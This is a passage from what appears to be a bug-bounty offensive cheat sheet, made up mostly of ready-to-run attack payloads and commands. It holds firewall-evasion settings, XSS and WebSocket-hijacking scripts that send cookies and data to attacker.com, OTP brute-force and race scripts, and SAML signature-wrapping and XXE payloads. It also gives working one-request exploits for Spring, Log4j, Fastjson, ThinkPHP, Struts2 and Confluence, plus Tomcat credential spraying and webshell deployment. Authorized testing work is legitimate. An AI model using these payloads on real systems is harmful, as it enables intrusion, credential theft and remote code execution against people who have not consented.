--tamper=modsecurityversioned,modsecurityzeroversioned,space2comment,randomcase

# Cloudflare (2025)
--tamper=space2comment,randomcase,charencode,between

# AWS WAF
--tamper=between,charencode,chardoubleencode

# Imperva
--tamper=randomcase,space2comment,equaltolike

# MySQL WAFs (general)
--tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,
         halfversionedmorekeywords,versionedkeywords,versionedmorekeywords

# MSSQL WAFs (general)
--tamper=between,charencode,charunicodeencode,equaltolike,space2comment,
         space2dash,space2mssqlblank

# Unknown WAF (throw everything)
--tamper=apostrophemask,base64encode,between,chardoubleencode,charencode,
         equaltolike,greatest,multiplespaces,nonrecursivereplacement,
         percentage,randomcase,space2comment,space2plus,unionalltounion,unmagicquotes
```

### Tool-Specific WAF Evasion Options

**ffuf:**
```bash
# Rate control to avoid triggering rate-limit WAF rules
ffuf -u https://target.com/FUZZ -w wordlist.txt \
  -rate 50          \   # max 50 req/s
  -p 0.1-0.5        \   # random delay 100-500ms per request
  -t 10                 # threads (lower = stealthier)

# Header rotation for WAF bypass
ffuf -u https://target.com/FUZZ -w wordlist.txt \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" \
  -H "Referer: https://target.com/"

# Filter out WAF block responses by size/words
ffuf -u https://target.com/FUZZ -w wordlist.txt \
  -fc 403,429       \   # filter 403 and 429 status codes
  -fw 97            \   # filter responses with 97 words (WAF block page)
  -fs 512               # filter 512-byte responses (WAF block page size)

# 403 bypass: fuzz the X-Forwarded-For header with IP list
ffuf -u https://target.com/admin -w ips.txt \
  -H "X-Forwarded-For: FUZZ" -mc 200
```

**wfuzz:**
```bash
wfuzz -z file,wordlist.txt \
  --hc 403,429 \
  -t 5 \                 # 5 threads (lower = less noisy)
  -s 0.5 \               # 0.5s delay between requests
  -H "X-Forwarded-For: 127.0.0.1" \
  https://target.com/FUZZ

# Multiple header injection for 403 bypass
wfuzz -z file,headers.txt -H "FUZZ" --hc 403 https://target.com/admin
```

**nuclei:**
```bash
# Rate limit WAF evasion
nuclei -u https://target.com \
  -rate-limit 10 \         # 10 req/s max
  -bulk-size 5 \           # 5 hosts per template batch
  -c 5 \                   # 5 concurrent templates
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "User-Agent: Mozilla/5.0"

# WAF detection first
nuclei -u https://target.com -t http/technologies/waf-detect.yaml

# Custom headers on all requests
nuclei -u https://target.com \
  -H "Referer: https://target.com/" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Burp Suite Extensions for WAF Bypass

| Extension | Function | Source |
|---|---|---|
| **nowafpls** | Insert junk at cursor (JSON/XML/URL/multipart/GraphQL) to push past WAF inspection limit | assetnote/nowafpls |
| **nowafplsV2** | Auto-inject junk for Active Scanner / DAST runs | irwankusuma/nowafplsV2 |
| **WAF Bypadd** | Pad requests with dummy data to exceed WAF inspection ceiling | PortSwigger/waf-bypadd |
| **HTTP Smuggler** | CL.TE / TE.CL / TE.TE desync testing | nccgroup/BurpSuiteHTTPSmuggler |
| **Hackvertor** | In-request encoding transforms (nest URL+HTML+unicode+base64) | PortSwigger BApp Store |
| **Param Miner** | Discover hidden/undocumented parameters | PortSwigger BApp Store |
| **IP Rotate** | Rotate source IP via AWS API Gateway | PortSwigger BApp Store |
| **Chunked Coding Converter** | Transform requests to chunked Transfer-Encoding | BApp Store / c0ny1 |
| **SAMLRaider** | XSW, signature stripping, XXE in SAML assertions | BApp Store |

---

## WEBSOCKET PAYLOADS

### IDOR / Auth Bypass
```javascript
// Test: subscribe to other user's channel
{"action": "subscribe", "channel": "user_VICTIM_ID_HERE"}
{"action": "get_history", "userId": "VICTIM_UUID"}
{"action": "getProfile", "id": 2}
{"action": "admin.listUsers"}
{"action": "admin.getToken", "userId": "1"}
```

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser automatically sends victim's cookies
ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));
</script>
```

### Test Origin Validation
```bash
# Should reject non-target origins. If it doesn't = CSWSH vulnerability
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
wscat -c "wss://target.com/ws" -H "Origin: null"
wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
```

### Injection via WS Messages
```javascript
// XSS in chat/notification system
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}

// SQLi
{"action": "search", "query": "' OR 1=1--"}

// SSRF (if server fetches URLs from messages)
{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}
```

---

## MFA / 2FA BYPASS PAYLOADS

### Pattern 1: OTP Brute Force (no rate limit)
```bash
# Try all 6-digit OTPs
ffuf -u "https://target.com/api/verify-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 \
  -t 5

# Rate limit bypass: rotate session tokens between requests
# Or use GraphQL batching to send 100 attempts per request
```

### Pattern 2: OTP Reuse (token not invalidated)
```
1. Request OTP → receive "123456"
2. Submit OTP correctly → authenticated
3. Log out
4. Log in again
5. Submit same OTP "123456" (expired? still works?)
6. Try OTP from previous session at new login
```

### Pattern 3: Response Manipulation
```
Step 1: Enter wrong OTP → intercept response in Burp
Step 2: Change: {"success": false, "message": "Invalid OTP"} → {"success": true}
Step 3: Forward modified response → sometimes app trusts it and proceeds
Also try: change status code 401 → 200, or change redirect from /failed to /dashboard
```

### Pattern 4: Code Predictability
```python
import requests, time

# Some implementations use timestamp-based OTPs:
for t_offset in range(-30, 31):  # Test ±30 seconds
    totp_value = generate_totp(secret, time.time() + t_offset)
    r = requests.post("https://target.com/api/mfa", json={"otp": totp_value})
    if r.status_code == 200:
        print(f"VALID at offset {t_offset}s: {totp_value}")
        break
```

### Pattern 5: Backup Codes Not Rate Limited
```bash
# Backup codes are typically 8-character alphanumeric = smaller space than 6-digit TOTP
# Try brute force on /api/verify-backup-code if no rate limit
```

### Pattern 6: Skip MFA Step (Workflow Bypass)
```bash
# After entering username/password, you get a session cookie
# Test: skip the /mfa/verify step entirely, go directly to /dashboard
# If cookie grants access before MFA = auth flow bypass

# Also: complete MFA in one session, reuse cookie in another browser
# Checks whether MFA completion is tied to the specific session
```

### Pattern 7: Race on MFA Verification
```python
import asyncio, aiohttp

# Race 2 MFA verifications simultaneously
# If both succeed = parallel session ATO
async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return await r.json()

async def race():
    async with aiohttp.ClientSession(cookies={"session": "YOUR_SESSION"}) as s:
        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
        print(results)

asyncio.run(race())
```

---

## SAML ATTACKS

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- Original valid assertion: -->
<saml:Assertion ID="legit">
  <NameID>user@company.com</NameID>
  <ds:Signature>VALID_SIGNATURE_OVER_legit</ds:Signature>
</saml:Assertion>

<!-- XSW: Inject malicious assertion before/after the signed one. -->
<!-- Server validates signature on #legit but processes #evil instead. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>     <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">              <!-- Original stays valid -->
    <NameID>user@company.com</NameID>
    <ds:Signature>VALID_SIGNATURE</ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Original: user@company.com -->
<!-- Injected:  -->
<NameID>admin<!---->@company.com</NameID>
<!-- XML parsers strip comments: admin@company.com -->
<!-- SAML validator sees "user@company.com" (before comment) -->
<!-- Application uses "admin@company.com" (after comment stripped) -->
```

### Attack 3: Signature Stripping
```
1. Capture SAMLResponse (base64 decode from browser)
2. Remove or modify the <Signature> element entirely
3. Change NameID to admin@company.com
4. Re-encode and submit
5. If server doesn't validate signature presence = admin login
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Response>
  <saml:Assertion>
    <NameID>&xxe;</NameID>
  </saml:Assertion>
</saml:Response>
```

### Tools
```bash
# SAMLRaider (Burp extension) — most automated XSW testing
# Install from BApp Store, intercept SAMLResponse, right-click → SAML Raider

# Manual: decode, modify, re-encode
echo "BASE64_SAML_RESPONSE" | base64 -d | xmllint --format - > saml.xml
# Edit saml.xml
cat saml.xml | base64 -w0  # Re-encode
```

---

## GF PATTERN NAMES (tomnomnom/gf)

```bash
# Install: https://github.com/tomnomnom/gf
# Usage: cat urls.txt | gf PATTERN

gf xss          # XSS parameters
gf ssrf         # SSRF parameters
gf idor         # IDOR parameters
gf sqli         # SQL injection parameters
gf redirect     # Open redirect parameters
gf lfi          # Local file inclusion
gf rce          # Remote code execution parameters
gf ssti         # Template injection parameters
gf debug_logic  # Debug/logic parameters
gf secrets      # Secret/token patterns
gf upload-fields # File upload parameters
gf cors         # CORS-related parameters
```

---

## ALWAYS REJECTED — NEVER SUBMIT

Submitting these destroys your validity ratio. N/A hurts. Don't.

```
Missing CSP / HSTS / X-Frame-Options / other security headers
Missing SPF / DKIM / DMARC
GraphQL introspection alone (no auth bypass, no IDOR)
Banner / version disclosure without a working CVE exploit
Clickjacking on non-sensitive pages (no sensitive action in PoC) — for working overlay PoC against sensitive action, see web2-vuln-classes **CSS Injection**
Tabnabbing
CSV injection (no actual code execution shown)
CORS wildcard (*) without credential exfil PoC
Logout CSRF
Self-XSS (only exploits own account)
Open redirect alone (no ATO chain, no OAuth code theft)
OAuth client_secret in mobile app (disclosed, expected)
SSRF with DNS callback only (no internal service access)
Host header injection alone (no password reset poisoning PoC)
Rate limit on non-critical forms (login page Cloudflare, search, contact)
Session not invalidated on logout
Concurrent sessions allowed
Internal IP address in error message
Mixed content (HTTP resources on HTTPS page)
SSL weak cipher suites
Missing HttpOnly / Secure cookie flags alone
Broken external links
Pre-account takeover (usually — requires very specific conditions)
Autocomplete on password fields
```

---

## CONDITIONALLY VALID — REQUIRES CHAIN

These are valid ONLY when combined with a chain that proves real impact:

| Standalone Finding | Chain Required | Result if Chained |
|---|---|---|
| Open redirect | + OAuth code theft via redirect_uri abuse | ATO (Critical) |
| Clickjacking | + sensitive action + working PoC (not just login) — see web2-vuln-classes **CSS Injection** for the opacity-overlay template | Medium |
| CORS wildcard | + credentialed request exfils user data | High |
| CSRF | + sensitive action (transfer funds, change email) | High |
| Rate limit bypass | + OTP/token brute force succeeding | Medium/High |
| SSRF DNS-only | + internal service access + data retrieval | Medium |
| Host header injection | + password reset email uses it | High |
| Prompt injection | + reads other user's data (IDOR) OR exfil OR RCE | High |
| S3 bucket listing | + JS bundles with API keys/OAuth secrets | Medium/High |
| Self-XSS | + CSRF to trigger it on victim | Medium |
| Subdomain takeover | + OAuth redirect_uri registered at that subdomain | Critical |
| GraphQL introspection | + auth bypass mutation or IDOR on node() | High |

**Rule:** Build the chain first, confirm it works end-to-end, THEN report. Never report A and say "could chain with B" — prove it.

---

## WORDLISTS (Installed in ~/wordlists/)

```
common.txt         # Common directories and files
params.txt         # Parameter names (id, user_id, file, etc.)
api-endpoints.txt  # API endpoint paths (/api/v1/users, etc.)
dirs.txt           # Directory names
sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
```

### Built-in Paths Worth Fuzzing

```bash
# Sensitive files
/.env
/.git/config
/config.json
/credentials.json
/backup.sql
/dump.sql
/.DS_Store
/robots.txt
/sitemap.xml
/.well-known/security.txt

# Admin panels
/admin
/admin/login
/administrator
/wp-admin
/manager
/console
/dashboard
/panel

# API discovery
/api
/api/v1
/api/v2
/graphql
/graphiql
/swagger
/swagger-ui.html
/api-docs
/openapi.json
/v1
/v2
```

---

---

## FRAMEWORK 1-DAY QUICK-WINS

Enterprise frameworks ship known-CVE footguns. Recon fingerprints the stack — this section bridges fingerprint -> exact detection request -> exploit payload -> severity so a stack match becomes a fast Critical/High instead of a note.

> **Why these pay:** a precise version fingerprint maps to a public CVE, and the PoC is a single request. This is the highest signal-per-minute work in the file — when `httpx`/`nuclei` flag Spring Boot, Tomcat, Confluence, ThinkPHP, etc., come straight here.

> **Before you claim impact:** confirm the running version is actually in the vulnerable range AND land the working PoC (extracted secret, reflected command output, deployed shell). A version banner alone is on the always-rejected list — "looks vulnerable" is N/A. Fingerprint via `Server`/`X-Application-Context` headers, error pages, `/META-INF/MANIFEST.MF`, `*.js.map`, or a `/package.json`/`/composer.json`/`/pom.xml` leak (see Error Disclosure / Debug Endpoints class).

### Quick Routing Table

| Fingerprint signal | Jump to | Best case |
|---|---|---|
| `X-Application-Context`, `/actuator`, Whitelabel error page | Spring Boot Actuator | Critical (heapdump secrets / env RCE) |
| Spring app + reflected expression sink | Spring SpEL | Critical (RCE) |
| Spring Cloud Gateway + `/actuator/gateway` | Spring Cloud Gateway | Critical (RCE) |
| Any Java app logging user input (UA, headers) | Log4Shell | Critical (RCE) |
| Java API echoing JSON, `@type` accepted | Fastjson / Jackson AutoType | Critical (RCE) |
| `Set-Cookie: PHPSESSID` + `?s=` routing, `think\` in errors | ThinkPHP | Critical (RCE) |
| Werkzeug traceback / `/console`, `Server: Werkzeug` | Flask / Werkzeug | Critical (RCE) |
| `Server: Apache-Coyote`, `/manager/html`, `JSESSIONID` | Tomcat Manager | Critical (RCE) |
| `.action`/`.do` URLs, `Struts` in stack trace | Struts2 OGNL | Critical (RCE) |
| `/control/main`, `OFBiz` in title/headers | Apache OFBiz | Critical (RCE) |
| `X-Confluence-Request-Time`, `/wiki`, Atlassian footer | Confluence OGNL | Critical (RCE) |

---

### Spring Boot Actuator (`/actuator/env`, `/heapdump`, `/gateway`)

**Fingerprint:** `X-Application-Context` header, Whitelabel Error Page, `/actuator` returns a JSON link index.

```bash
# Detection — enumerate exposed actuators (try both old and new base paths)
for p in env health info heapdump mappings configprops gateway threaddump beans; do
  for base in /actuator /; do
    curl -s -o /dev/null -w "%{http_code} ${base}${p}\n" "https://target.com${base}${p}"
  done
done
# 200 on /actuator/env or /actuator/heapdump = lead
```

**Exploit — heapdump secret extraction (Critical, no auth needed):**
```bash
# Download the JVM heap snapshot, then grep live secrets out of it
curl -s "https://target.com/actuator/heapdump" -o heap.hprof   # often 50-500MB
strings heap.hprof | grep -iE 'password|secret|aws_|api[_-]?key|jdbc:|authorization|bearer ' | sort -u
# Heap routinely contains: DB creds, AWS access/secret keys, internal service URLs,
# Basic-Auth blobs, session tokens. Each extracted live credential = its own finding.
```

**Exploit — `/env` write -> RCE (Critical, when POST is allowed on older Boot 1.x/2.x):**
```bash
# 1. Point a property at an attacker-controlled XML/YAML to trigger remote bean load
curl -s "https://target.com/actuator/env" -X POST -H "Content-Type: application/json" \
  -d '{"name":"spring.cloud.bootstrap.location","value":"http://ATTACKER/x.yml"}'
# 2. /actuator/refresh re-reads it -> deserialization / SpEL -> RCE (eureka-client gadget classic)
curl -s "https://target.com/actuator/refresh" -X POST
```

> **Submittable:** an extracted live credential, or proven RCE. **N/A:** `/actuator/health` exposed alone, or `/env` with all values masked as `******`.

---

### Spring SpEL Injection

**Fingerprint:** Spring app reflecting a parameter into an expression sink (route conditions, `@Value`, query builders, error templates).

```bash
# Detection — math eval differential. ${...} and #{...} are DIFFERENT engines, do not conflate them.
curl -s "https://target.com/path?x=%23%7B7*7%7D"        # #{7*7} -> 49 = TRUE SpEL (the RCE-capable sink)
curl -s "https://target.com/path?x=%24%7B7*7%7D"        # ${7*7} -> 49 = property-placeholder reflection ONLY (not full SpEL)
```

> **⚠️ `${...}` is a trap.** `${7*7}->49` is usually Spring's property-placeholder / error-page reflection, which does **not** evaluate the `T(...)` operator — `${T(java.lang.Runtime)...}` silently fails. Only a **true SpEL sink** (`#{...}`, or `SpelExpressionParser.parseExpression()` on your input) runs the RCE payloads below. Confirm with `#{7*7}` before burning the 5-minute window on `T()` payloads.

**Exploit (Critical, RCE) — needs a true SpEL `#{...}` / parseExpression sink:**
```java
#{T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","id"})}
#{T(org.springframework.cglib.core.ReflectUtils).defineClass(...)}            // bypass when Runtime blocked
// DNS-confirm RCE when no output reflection:
#{T(java.net.InetAddress).getByName('OUTPUT.attacker.oast.site')}
```

> **Submittable:** reflected `id`/`whoami` output or an OAST DNS hit you control via a `#{}`/SpEL sink. **N/A:** `49` reflection alone (especially `${}`-only) with no working `T()` execution — that is just expression reflection, keep digging to a real SpEL sink + RCE.

---

### Spring Cloud Gateway — SpEL Code Injection (CVE-2022-22947)

**Fingerprint:** Spring Cloud Gateway 3.0.0–3.0.6 / 3.1.0 with the `gateway` actuator exposed.

```bash
curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/actuator/gateway/routes"   # 200 = exposed
```

**Exploit (Critical, unauthenticated RCE):**
```bash
# 1. Add a route whose filter contains a SpEL payload
curl -s -X POST "https://target.com/actuator/gateway/routes/poc" \
  -H "Content-Type: application/json" -d '{
  "id":"poc","filters":[{"name":"AddResponseHeader","args":{
    "name":"Result",
    "value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
  }}],"uri":"http://example.com"}'
# 2. Refresh to evaluate the SpEL, 3. hit the route to read output in the Result header, 4. delete route
curl -s -X POST "https://target.com/actuator/gateway/refresh"
curl -si "https://target.com/actuator/gateway/routes/poc" | grep -i Result
curl -s -X DELETE "https://target.com/actuator/gateway/routes/poc"
```

---

### Log4Shell — Log4j JNDI (CVE-2021-44228)

**Fingerprint:** any Java app that logs user input — User-Agent, `X-Api-Version`, `Referer`, username fields, search boxes. No version banner needed; spray the marker and watch for a callback.

```bash
# Detection — OAST DNS/LDAP callback. Use interactsh-client / Burp Collaborator for OAST.
PAYLOAD='${jndi:ldap://${hostName}.OAST_ID.oast.site/a}'   # ${hostName} tags which host fired
curl -s "https://target.com/" \
  -H "User-Agent: $PAYLOAD" -H "X-Api-Version: $PAYLOAD" -H "Referer: $PAYLOAD"
# WAF-evasion variants if the literal is filtered:
# ${${::-j}ndi:${::-l}${::-d}${::-a}${::-p}://x.oast.site/a}
# ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://x.oast.site/a}
# ${jndi:dns://x.oast.site/a}   (DNS-only — proves reachability even if LDAP egress is blocked)
```

> **Submittable:** an OAST hit you control proving server-side JNDI lookup (the `${hostName}`/`${env:...}` exfil variant strengthens it by leaking real data). DNS-only callback = Medium; full LDAP-gadget RCE = Critical. **N/A:** no callback (target patched or not logging that sink).

---

### Fastjson / Jackson AutoType (JNDI Deserialization)

**Fingerprint:** Java API that parses a JSON request body and reflects/echoes it; sending an extra `@type` key changes behavior or errors with `autoType is not support`.

```bash
# Detection — DNS probe via JdbcRowSetImpl (works <= 1.2.80 patterns; SafeMode off)
curl -s "https://target.com/api/x" -H "Content-Type: application/json" -d '{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://OAST_ID.oast.site/a",
  "autoCommit":true
}'
# OAST DNS hit = AutoType reachable. Jackson equivalent abuses polymorphic @class / enableDefaultTyping.
```

**Exploit (Critical, RCE):** stand up a malicious JNDI server, then point `dataSourceName` at it.
```bash
# JNDI-Exploit-Kit / rogue-jndi serves an LDAP/RMI ref that returns an RCE gadget
java -jar JNDIExploit.jar -i ATTACKER_IP
# dataSourceName -> ldap://ATTACKER_IP:1389/Basic/Command/base64/<payload>
```
> **Note:** post-JDK-8u191, attacker JNDI must use a local-classpath gadget (BeanFactory/ELProcessor) instead of remote codebase. **Submittable:** OAST hit + landed gadget (reflected command output / shell). **N/A:** `autoType is not support` returned = blocked, move on.

---

### ThinkPHP 5.x RCE (`invokefunction`)

**Fingerprint:** PHP app, `?s=` routing in URLs, `think\` namespace in errors, `Set-Cookie: PHPSESSID`. Affected: 5.0.5–5.0.22 and 5.1.x before 5.1.31.

```bash
# Detection + RCE in one shot (5.0.x) — reflected command output = confirmed
curl -s "https://target.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" | grep -i 'php version'

# RCE — run a command (5.0.x)
curl -s "https://target.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"

# 5.1.x variant (no index.php prefix needed; abuses filter/Request)
curl -s "https://target.com/?s=index/\think\Request/input&filter[]=system&data=id"
curl -s "https://target.com/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
```

> **Submittable:** reflected `id`/`phpinfo()` output. **N/A:** 404/200 with no command echo (patched or non-vuln minor).

---

### Flask / Werkzeug Debug Console (PIN Regeneration)

**Fingerprint:** `Server: Werkzeug/...` header, an interactive traceback page on error, or `/console` returning a PIN prompt — means `debug=True` shipped to prod.

```bash
# Detection — does the debug console exist?
curl -s "https://target.com/console" | grep -i 'pin\|werkzeug\|interactive'
# Trigger a traceback to confirm debug mode (any 500-inducing input)
```

**Exploit (Critical, RCE) — regenerate the PIN when you also have an LFI / path traversal:**
The PIN is deterministic from local files. With an LFI primitive (see Path Traversal payloads) read the six inputs, then reproduce the PIN offline:
```bash
# Leak the PIN ingredients via LFI:
#   username       -> /etc/passwd (the user running the app, e.g. www-data)
#   modname        -> usually 'flask.app'
#   appname        -> usually 'Flask'
#   app file path  -> .../site-packages/flask/app.py   (from the traceback)
#   MAC (decimal)  -> /sys/class/net/eth0/address  -> int(mac.replace(':',''),16)
#   machine-id     -> /etc/machine-id  (+ /proc/self/cgroup docker id if containerized)
# Feed all six into the public Werkzeug PIN algorithm, submit at /console -> Python REPL:
#   __import__('os').popen('id').read()
```

> **Submittable:** code execution in the console (proves debug-prod + PIN broken). Even debug=True alone with the interactive traceback is a reportable info-leak (source + local vars + env). **N/A:** generic 500 page with no interactive traceback.

---

### Tomcat Manager — Weak Creds + WAR Deploy / PUT Write

**Fingerprint:** `Server: Apache-Coyote/1.1`, `JSESSIONID` cookie, `/manager/html` prompts Basic-Auth.

```bash
# Detection — default/weak manager creds (try the classic shortlist, throttle to respect rate limits)
for cred in tomcat:tomcat admin:admin tomcat:s3cret admin:tomcat manager:manager tomcat:admin; do
  curl -s -o /dev/null -w "$cred -> %{http_code}\n" -u "$cred" "https://target.com/manager/text/list"
done   # 200 = authenticated to Manager
```

**Exploit A (Critical, RCE) — deploy a JSP webshell WAR:**
```bash
# Build a minimal WAR with a cmd JSP, then deploy via the text API
curl -s -u USER:PASS -T shell.war "https://target.com/manager/text/deploy?path=/poc&update=true"
curl -s "https://target.com/poc/shell.jsp?cmd=id"
```

**Exploit B (Critical, RCE) — PUT JSP write, CVE-2017-12615 (Windows, `readonly=false`):**
```bash
curl -s -X PUT "https://target.com/poc.jsp/" --data-binary @shell.jsp   # trailing slash bypasses block
curl -s "https://target.com/poc.jsp?cmd=id"
```

> **Submittable:** authenticated Manager access (already High — it is admin of the app server) escalated to deployed-shell command output. **N/A:** Manager page reachable but every credential returns 401/403.

---

### Struts2 OGNL (S2-045 / S2-046, CVE-2017-5638)

**Fingerprint:** `.action` / `.do` URLs, `Struts` in stack traces, OGNL artifacts. S2-045 lives in the Jakarta multipart parser via a malicious `Content-Type`.

```bash
# Detection + RCE (S2-045) — command output reflected in a custom header
curl -s -D - "https://target.com/index.action" \
  -H "Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#ct.setMemberAccess(#dm)).(#cmd='id').(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/bash','-c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

> **Submittable:** reflected command output in the response/header. **N/A:** no output (likely patched — Struts2 OGNL is heavily virtual-patched by WAFs; a 403 here is often the WAF, not the fix).

---

### Apache OFBiz — Unauthenticated RCE (CVE-2023-49070 / CVE-2024-45195)

**Fingerprint:** `/control/main`, `OFBiz` in the title/headers, `/webtools/control/...` paths. Affected: < 18.12.10 (XML-RPC chain) and < 18.12.16 (view-auth bypass chain).

```bash
# Detection — is the auth-bypass view reachable? (override params force an unauthenticated screen render)
curl -sk "https://target.com/webtools/control/ViewBlogArticle?USERNAME=&PASSWORD=&requirePasswordChange=Y" -o /dev/null -w "%{http_code}\n"
# CVE-2023-49070: legacy XML-RPC endpoint still mounted
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/webtools/control/xmlrpc"
```

**Exploit (Critical, unauthenticated RCE):** the auth bypass (`requirePasswordChange=Y` / empty-creds override) reaches a screen that renders a Groovy program; chain to `ProgramExport`/XML-RPC deserialization to run a command. Use the public PoCs (jakabakos/Apache-OFBiz-Authentication-Bypass) to drive the request set, then confirm with an OAST callback or reflected output.

> **Submittable:** proven command execution via the bypass chain. **N/A:** login page reachable but the override params still demand auth (patched ≥ 18.12.16).

---

### Confluence / Atlassian OGNL (CVE-2022-26134)

**Fingerprint:** `X-Confluence-Request-Time` header, `/wiki` base, Atlassian footer. Pre-auth OGNL injection — the URL namespace is evaluated as OGNL.

```bash
# Detection + RCE — command output returned in the X-Cmd-Response header (one request)
curl -sk -D - -o /dev/null "https://target.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
# Decoded namespace: ${(#a=@org.apache.commons.io.IOUtils@toString(
#   @java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).
#   (@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
# A populated X-Cmd-Response header in the reply = confirmed unauthenticated RCE.
```

> **Submittable:** `X-Cmd-Response` containing real command output. Affected: all supported versions before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1. **N/A:** header absent (patched). Note many Confluence instances are vendor-hosted — check scope and asset ownership before firing.

---

> **Chain note:** these often escalate — Spring heapdump -> AWS keys -> see SSRF class / cloud-metadata pivot; Tomcat/Confluence/OFBiz shell -> internal network -> SSRF and IDOR on adjacent services. Pull the secret or land the shell first, then map what it unlocks before writing the report.
